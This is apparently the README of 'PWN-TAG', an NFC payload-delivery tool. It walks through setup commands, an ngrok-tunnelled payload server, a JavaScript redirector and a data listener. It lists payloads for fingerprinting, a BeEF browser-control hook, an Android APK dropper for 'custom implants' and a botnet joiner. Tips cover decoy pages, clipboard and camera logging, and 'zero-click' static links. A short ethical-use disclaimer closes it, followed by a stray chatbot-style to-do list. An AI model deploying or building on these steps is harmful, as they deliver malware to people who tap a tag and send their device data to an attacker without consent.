# PWN-TAG  
_"tag to pwn"_ — NFC payload delivery system for social engineering, red team ops, and mobile testing.

PWN-TAG lets you write NFC tags that trigger live payloads on mobile devices — from fingerprinting to botnet enrollment. Built for ethical hackers, educators, defenders, and curious minds.

---

## Branches

| Branch         | Purpose                                                                 |
|----------------|-------------------------------------------------------------------------|
| `main`         | Free-tier version using randomized ngrok URLs (requires tap + confirm) |
| `ngrok-pro`    | Paid ngrok version with static subdomains → enables **zero-click** payloads |

Switch branches like this:

```bash
git checkout ngrok-pro
````

---

##  What You Need

*  NFC tag stickers (\~\$10 for 25):
  [https://a.co/d/gl2XRV8](https://a.co/d/gl2XRV8)

*  NFC writer app (free):
  [https://apps.apple.com/app/id1252962749](https://apps.apple.com/app/id1252962749)

*  A Debian-based Linux system 

*  A [ngrok](https://ngrok.com/) account (free or paid)

---

##  Installation (Clone + Setup)

```bash
git clone https://github.com/ekomsSavior/PWN-TAG.git
cd PWN-TAG
```

# (Optional) Switch to pro version for static subdomain support
git checkout ngrok-pro

# Install Python dependencies

```bash
sudo apt update
sudo apt install python3 python3-pip -y
pip3 install flask
```

---

##  Usage (4 Terminal Workflow)

### Terminal 1 — Start Payload Server

```bash
python3 -m http.server 8080
```

This serves your payloads at `http://localhost:8080`

---

### Terminal 2 — Start ngrok Tunnel

```bash
ngrok http 8080
```

Copy the `https://...ngrok.app` URL — this becomes your **NFC tag link**.

---

### Terminal 3 — Edit Payload Redirector

```bash
nano payloads/test_shell.html
```

Update this line with your current ngrok URL:

```javascript
window.location.href = "https://your-ngrok-subdomain.ngrok.app/payloads/bot_joiner.html";
```

---

### Terminal 4 — Start Listener

```bash
python3 listener.py
```

Logs any device fingerprinting or interaction data sent by payloads.

---

## Write Your NFC Tag

Using your NFC writer app:

1. Tap **Write**
2. Add Record → **URL**
3. Paste something like:

```
https://pwn-tag.ngrok.app/payloads/test_shell.html
```

4. Tap “Write” to encode it

 Now when someone taps the tag, it opens the redirector → logs the device → delivers your payload.

---

##  Payload Options (Examples & Use Cases)

| Payload               | Path                       | Description                                                         |
| --------------------- | -------------------------- | ------------------------------------------------------------------- |
| **Test Shell**        | `payloads/test_shell.html` | Logs fingerprint (user agent, screen size, timezone) then redirects |
| **Full Beacon Shell** | `payloads/beef_shell.html` | Loads a BEEF hook for browser control (if server is running)        |
| **APK Dropper**       | `payloads/spy.apk`         | Sends Android users a direct APK (custom implants welcome)          |
| **Rogue Joiner**      | `payloads/bot_joiner.html` | Simulates Rogue Botnet join — connect, beacon, execute JS           |

---

##  Swapping Payloads (Beginner-Friendly)

1. Open `payloads/test_shell.html`
2. Change this line:

```javascript
window.location.href = "https://your-ngrok.ngrok.app/payloads/YOUR_FILE_HERE";
```

3. Example:

```javascript
window.location.href = "https://pwn-tag.ngrok.app/payloads/spy.apk";
```

 No need to rewrite the NFC tag if you're using a static domain — just update the file.

---

##  Pro Tips

*  Make multiple redirectors (`redirect_to_apk.html`, etc.)
*  Make `index.html` a 403 decoy or fake blog
*  Want geolocation? Use `https://ipinfo.io/json` in your JS
*  Want deep traps? Chain to `clipboard.js`, `camlog`, etc. before redirect
*  With static domains (`ngrok-pro`), your NFC tags are reusable forever

---

##  Ethical Usage

This tool is intended for **educational purposes, red-team ops, and ethical testing only**.
You are responsible for your actions. Do not use this on devices or individuals without consent.

---


- ✅ `setup_repo.sh` for auto-deployment
- ✅ A `payloads/README.md` to explain each file
- ✅ BEEF hook setup instructions
- ✅ QR code payload variants for phones with no NFC

Let’s make this repo unforgettable 🌐💥
```
